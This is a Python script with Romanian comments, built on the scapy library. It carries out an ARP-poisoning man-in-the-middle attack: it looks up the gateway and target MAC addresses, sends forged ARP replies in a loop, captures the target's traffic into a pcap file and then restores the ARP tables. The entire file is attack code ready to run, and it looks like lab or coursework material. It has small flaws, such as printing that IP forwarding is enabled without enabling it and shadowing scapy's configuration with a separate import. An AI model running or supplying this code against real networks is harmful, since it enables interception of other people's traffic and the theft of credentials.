import signal
import conf as conf
from scapy.all import *
from scapy.layers.l2 import ARP

# Parametrii procesului de otravire ARP
gateway_ip = "198.10.0.2"
target_ip = "198.10.0.1"
packet_count = 1000
conf.iface = "eth0"
conf.verb = 0


# De la un IP dat, preluam MAC. Trimitem un ARP request pentru o adresa IP.
# Ar trebui sa primim un raspuns ARP cu adresa MAC
def get_mac(ip_address):
    # Request-ul ARP este construit. functia sr se foloseste pentru a trimite un layer de 3 pachete
    # Metoda alternativa: resp, unans =  srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip_address))
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
    for s, r in resp:
        return r[ARP].hwsrc
    return None


# Restauram reteaua inversand atacul ARP.
# Trimitem raspunsul ARP cu adresa MAC corecta si informatii despre adresa IP
def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
    print("[*] Disabling IP forwarding")
    # Dezactivam IP Forwarding pe os
    os.system("sysctl -w net.inet.ip.forwarding=0")
    # Oprim procesul curent
    os.kill(os.getpid(), signal.SIGTERM)


# Continuam sa trimitem raspunsuri ARP false pentru a pune procesul din mijloc sa intercepteze pachete
# Vom folosi adresa MAC a interfetei drept hwdst pentru raspunsul ARP
def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] Started ARP poison attack [CTRL-C to stop]")
    try:
        while True:
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
            time.sleep(2)
    except KeyboardInterrupt:
        print("[*] Stopped ARP poison attack. Restoring network")
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)


def arp_spoofing():
    # Pornim script-ul
    print("[*] Starting script: arp_poison.py")
    print("[*] Enabling IP forwarding")
    print(f"[*] Gateway IP address: {gateway_ip}")
    print(f"[*] Target IP address: {target_ip}")

    gateway_mac = get_mac(gateway_ip)
    if gateway_mac is None:
        print("[!] Unable to get gateway MAC address. Exiting..")
        sys.exit(0)
    else:
        print(f"[*] Gateway MAC address: {gateway_mac}")

    target_mac = get_mac(target_ip)
    if target_mac is None:
        print("[!] Unable to get target MAC address. Exiting..")
        sys.exit(0)
    else:
        print(f"[*] Target MAC address: {target_mac}")

    # Pornim thread-ul
    poison_thread = threading.Thread(target=arp_poison, args=(gateway_ip, gateway_mac, target_ip, target_mac))
    poison_thread.start()

    # Observam traficul si salvam in fisiere. Captura este filtrata pe masina destinatie
    try:
        sniff_filter = "ip host " + target_ip
        print(f"[*] Starting network capture. Packet Count: {packet_count}. Filter: {sniff_filter}")
        packets = sniff(filter=sniff_filter, iface=conf.iface, count=packet_count)
        wrpcap(target_ip + "_capture.pcap", packets)
        print(f"[*] Stopping network capture..Restoring network")
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
    except KeyboardInterrupt:
        print(f"[*] Stopping network capture..Restoring network")
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
        sys.exit(0)


if __name__ == '__main__':
    arp_spoofing()
